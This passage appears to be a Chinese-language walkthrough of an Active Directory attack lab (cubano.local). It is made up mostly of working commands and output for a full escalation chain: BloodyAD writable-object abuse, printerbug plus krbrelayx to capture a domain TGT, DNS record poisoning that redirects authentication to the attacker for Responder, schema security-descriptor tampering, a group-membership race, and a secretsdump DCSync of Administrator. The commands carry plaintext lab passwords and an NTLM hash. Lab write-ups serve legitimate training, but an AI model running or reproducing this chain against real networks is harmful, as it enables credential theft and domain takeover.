```plain
upload /home/kali/Desktop/tools/PowerSploit/PowerView.ps1
```

#### import
```plain
. ./PowerView.ps1
```

### BloodyAD
#### support-writable
##### 命令
```plain
proxychains -q bloodyAD -d cubano.local -u support -p 'aad3b435b51404eeaad3b435b51404ee:97179aeefd6f3a6d329c37184fc639af' --host dc.cubano.local --dc-ip 192.168.23.10 get writable
```

##### 输出
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q bloodyAD -d cubano.local -u support -p 'aad3b435b51404eeaad3b435b51404ee:97179aeefd6f3a6d329c37184fc639af' --host dc.cubano.local --dc-ip 192.168.23.10 get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=cubano,DC=local
permission: WRITE

distinguishedName: OU=contractors,DC=cubano,DC=local
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: OU=event,DC=cubano,DC=local
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=support,CN=Users,DC=cubano,DC=local
permission: WRITE

distinguishedName: OU=inhouse,DC=cubano,DC=local
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=HOXHA2,OU=inhouse,DC=cubano,DC=local
permission: WRITE
DACL: WRITE
```

+ `get writable` 返回：
    - `OU=inhouse,DC=cubano,DC=local`具备 `CREATE_CHILD; WRITE; OWNER: WRITE; DACL: WRITE`

##### 结论
+ `support` 对 `OU=inhouse` 是“容器级可写”，但不是对现有用户对象属性直接可写
+ 下一步应沿 `CREATE_CHILD` 路径先落新对象，再借继承权限继续推进


```plain
[+] heathcliff created
```

+ 已在 `OU=inhouse` 成功创建新机器对象 `**heathcliff$**`
+ 现场链路进入下一阶段：围绕 `heathcliff$` 与 `albany` 做 SPN/票据链验证

### 横向移动
> 我们成功拿到了exchange的域用户凭据接下来可以使用打印机漏洞
>

#### printerbug
##### 1) 触发 `EXCHANGE$` TGT 
###### 命令
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q /usr/bin/python3 /home/kali/Desktop/tools/krbrelayx/krbrelayx.py -s albany -p '#1princess$' 
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
```

```plain
proxychains -q /usr/bin/python3 /home/kali/Desktop/tools/krbrelayx/printerbug.py 'CUBANO.LOCAL/albany:#1princess$@exchange.cubano.local' pro.cubano.local -target-ip 192.168.23.146
```

###### 输出摘要
```plain
[*] SMBD: Received connection from 10.10.110.50
[*] Got ticket for EXCHANGE$@CUBANO.LOCAL [krbtgt@CUBANO.LOCAL]
[*] Saving ticket in EXCHANGE$@CUBANO.LOCAL_krbtgt@CUBANO.LOCAL.ccache
```

+ 票据文件落地：
    - `/home/kali/Desktop/htb/Aptlabs/codex/cubano_2026-04-09/EXCHANGE$@CUBANO.LOCAL_krbtgt@CUBANO.LOCAL.ccache`

```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
net use \\192.168.23.14\c
iwr http://192.168.23.14 -UseBasicParsing -UseDefaultCredentials
```

### WebDSC
> “WebDSC”通常指的是 **WebAdministrationDsc**，这是一个强大的 **PowerShell Desired State Configuration (DSC)** 资源模块，主要用于自动化管理 **Internet Information Services (IIS)**
>
> ****
>
> 在 C:\Users\administrator.CUBANO\Documents文件夹下发现WebDSC目录递归找到web.cubano.local.mof
>

#### 文件发现
```plain
*Evil-WinRM* PS C:\Users\administrator.CUBANO\Documents> dir -Force
 


    Directory: C:\Users\administrator.CUBANO\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hsl        3/14/2020   2:06 AM                My Music
d--hsl        3/14/2020   2:06 AM                My Pictures
d--hsl        3/14/2020   2:06 AM                My Videos
d--h--         9/5/2020   6:46 PM                WebDSC
d-----        3/24/2020  10:22 AM                WindowsPowerShell
-a-hs-       11/17/2025   5:06 AM            402 desktop.ini

*Evil-WinRM* PS C:\Users\administrator.CUBANO\Documents> dir -Force C:\Users\administrator.CUBANO\Documents\WebDSC
 


    Directory: C:\Users\administrator.CUBANO\Documents\WebDSC


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         9/5/2020   6:46 PM          10170 web.cubano.local.mof
```

### BloodyAD
####  knut memberOf
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q bloodyAD -d cubano.local -u knut -p 'G32Gh@Gh23v' --host dc.cubano.local --dc-ip 192.168.23.10 get object knut --attr memberOf

distinguishedName: CN=knut,DC=cubano,DC=local
memberOf: CN=webadmins,DC=cubano,DC=local
```

#### members webadmins
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q bloodyAD -d cubano.local -u knut -p 'G32Gh@Gh23v' --host dc.cubano.local --dc-ip 192.168.23.10 get object 'CN=webadmins,DC=cubano,DC=local' --attr member

distinguishedName: CN=webadmins,DC=cubano,DC=local
member: CN=emma,CN=Users,DC=cubano,DC=local; CN=knut,DC=cubano,DC=local
```

#### emma  memberOf

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q bloodyAD -d cubano.local -u knut -p 'G32Gh@Gh23v' --host dc.cubano.local --dc-ip 192.168.23.10 get object emma --attr memberOf

```

### 横向移动
#### BloodyAD
> + `fileserver` 当前已重新指向本机 `tun0`
> + 现在可以直接重开 `Responder` 等待 `WEB` 后台任务 / PowerShell 流量对 `HTTP/fileserver.cubano.local` 发起认证
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q bloodyAD -d cubano.local -u knut -p 'G32Gh@Gh23v' --host dc.cubano.local --dc-ip 192.168.23.10 add dnsRecord fileserver 10.10.16.14

[+] fileserver has been successfully added
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q bloodyAD -d cubano.local -u knut -p 'G32Gh@Gh23v' --host dc.cubano.local --dc-ip 192.168.23.10 get search --base 'CN=MicrosoftDNS,DC=DomainDnsZones,DC=cubano,DC=local' --filter '(name=fileserver)' --attr distinguishedName,dnsRecord,name

distinguishedName: DC=fileserver,DC=cubano.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=cubano,DC=local
dnsRecord.Data: 10.10.16.14
dnsRecord.Type: A
dnsRecord.TtlSeconds: 300
name: fileserver
```

+ 结果：
    - `fileserver has been successfully added`
    - LDAP 读回：
        * `distinguishedName: DC=fileserver,DC=cubano.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=cubano,DC=local`
        * `dnsRecord.Data: 10.10.16.14`
        * `dnsRecord.Type: A`

#### 获取 `emma` 的 SID
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q bloodyAD -d cubano.local -u emma -p 'V@mp!r3s' --host dc.cubano.local --dc-ip 192.168.23.10 get object emma --attr objectSid

distinguishedName: CN=emma,CN=Users,DC=cubano,DC=local
objectSid: S-1-5-21-854239470-2015502385-3018109401-52104
```

#### defaultSecurityDescriptor
```plain
proxychains -q bloodyAD -d cubano.local -u emma -p 'V@mp!r3s' --host dc.cubano.local --dc-ip 192.168.23.10 set object 'CN=Group,CN=Schema,CN=Configuration,DC=cubano,DC=local' defaultSecurityDescriptor -v 'D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;S-1-5-21-854239470-2015502385-3018109401-52104)'
```

#### 终端 A：轮询监控 `new_admingroup` 的变化
```plain
proxychains -q bloodyAD -d cubano.local -u emma -p 'V@mp!r3s' --host dc.cubano.local --dc-ip 192.168.23.10 get object new_admingroup --attr objectSid,whenCreated,whenChanged,memberOf,member
```

**作用**：反复执行，观察 `objectSid` 或 `whenCreated` 何时改变，一旦改变说明组已重建。

#### 终端 B：将 `emma` 加入新的 `new_admingroup`
```plain
proxychains -q bloodyAD -d cubano.local -u emma -p 'V@mp!r3s' --host dc.cubano.local --dc-ip 192.168.23.10 add groupMember new_admingroup emma
```

**作用**：在窗口期内执行添加操作。

#### 终端 C：验证 `emma` 是否已成为 `new_admingroup` 的成员
```plain
proxychains -q bloodyAD -d cubano.local -u emma -p 'V@mp!r3s' --host dc.cubano.local --dc-ip 192.168.23.10 get object emma --attr memberOf
```

**期望输出**：`memberOf` 中包含 `CN=new_admingroup,CN=Users,DC=cubano,DC=local`

#### 终端 D：一旦确认成员关系，立即 DCSync Administrator
```plain
┌──(kali㉿kali)-[~/Desktop/htb/Aptlabs]
└─$ proxychains -q /usr/bin/python3 /home/kali/Desktop/tools/impacket/examples/secretsdump.py -dc-ip 192.168.23.10 'CUBANO/emma:V@mp!r3s@dc.cubano.local' -just-dc-user Administrator
```
